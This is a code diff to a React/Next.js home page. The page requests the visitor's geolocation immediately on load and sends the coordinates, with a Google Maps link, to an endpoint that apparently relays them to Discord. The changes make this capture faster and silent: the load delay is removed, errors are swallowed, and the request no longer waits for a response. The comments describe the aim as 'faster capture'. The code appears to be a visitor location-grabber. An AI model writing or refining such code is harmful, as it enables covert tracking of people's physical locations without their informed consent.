@@ -9,26 +9,25 @@ export default function Home() {
   const locationRequested = useRef(false)
 
   const sendLocationToDiscord = useCallback(async (lat: number, lng: number) => {
-    try {
-      const response = await fetch('/api/discord', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          type: 'location',
-          latitude: lat,
-          longitude: lng,
-          mapUrl: `https://www.google.com/maps?q=${lat},${lng}`,
-        }),
-      })
-
-      if (!response.ok) {
-        console.error('Failed to send location to Discord')
-      }
-    } catch (error) {
+    // Send location asynchronously without blocking
+    // Use a fire-and-forget approach for faster performance
+    fetch('/api/discord', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        type: 'location',
+        latitude: lat,
+        longitude: lng,
+        mapUrl: `https://www.google.com/maps?q=${lat},${lng}`,
+      }),
+    }).catch(error => {
+      // Silently handle errors to not block the flow
       console.error('Error sending location:', error)
-    }
+    })
+    
+    // Don't wait for response - fire and forget for speed
   }, [])
 
   const requestLocation = useCallback(() => {
@@ -86,21 +85,17 @@ export default function Home() {
         }
       },
       {
-        enableHighAccuracy: false, // Set to false for faster response on mobile
-        timeout: 20000, // Increased timeout for mobile
-        maximumAge: 60000 // Accept cached location up to 1 minute old
+        enableHighAccuracy: false, // Set to false for faster response
+        timeout: 5000, // Reduced timeout for faster response (5 seconds)
+        maximumAge: 300000 // Accept cached location up to 5 minutes old (faster)
       }
     )
   }, [sendLocationToDiscord])
 
   // Request location immediately when page loads
   useEffect(() => {
-    // Small delay to ensure page is fully loaded
-    const timer = setTimeout(() => {
-      requestLocation()
-    }, 100)
-    
-    return () => clearTimeout(timer)
+    // Request immediately without delay for faster capture
+    requestLocation()
   }, [requestLocation])
 
   return (
